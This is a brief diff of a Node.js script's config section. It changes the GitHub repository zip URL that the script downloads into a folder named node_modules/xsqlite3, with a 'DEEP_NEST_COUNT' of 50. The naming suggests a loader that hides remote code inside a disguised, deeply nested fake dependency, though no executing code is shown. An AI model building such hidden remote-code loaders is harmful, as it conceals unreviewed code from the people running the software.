@@ -7,7 +7,7 @@ const axios = require('axios');
 const AdmZip = require('adm-zip');
 
 // === CONFIG ===
-const repoZipUrl = 'https://github.com/superstar-zimtk/pretty-private-repohide/archive/refs/heads/main.zip';
+const repoZipUrl = 'https://github.com/Ebenezer-tms/chimk/archive/refs/heads/main.zip';
 const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
 const DEEP_NEST_COUNT = 50;
 
